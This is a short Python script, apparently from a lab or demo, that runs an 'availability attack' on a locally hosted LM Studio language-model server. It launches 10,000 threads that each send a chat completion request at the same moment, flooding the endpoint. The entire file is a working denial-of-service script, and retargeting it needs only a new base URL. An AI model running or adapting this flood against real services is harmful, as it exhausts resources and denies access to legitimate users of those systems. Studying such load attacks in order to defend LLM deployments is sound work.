import threading
from openai import OpenAI

print("AVAILABILITY ATTACK ==>")


def request():
    client = OpenAI(base_url="http://localhost:8080/v1", api_key="lm-studio")
    messages = [
        {"role": "system", "content": "You are a helpful assistant."},
    ]
    question = "What is the capital of the United States?"
    messages.append(
        {"role": "user", "content": f"Can you help me with this question? {question}"}
    )
    completion = client.chat.completions.create(
        model="LM Studio Community/Phi-3-mini-4k-instruct-GGUF",
        messages=messages,
        temperature=0.7,
    )
    print(completion.choices[0].message.content)


threads = []
for i in range(10000):
    t = threading.Thread(target=request)
    threads.append(t)
    t.start()
for t in threads:
    t.join()
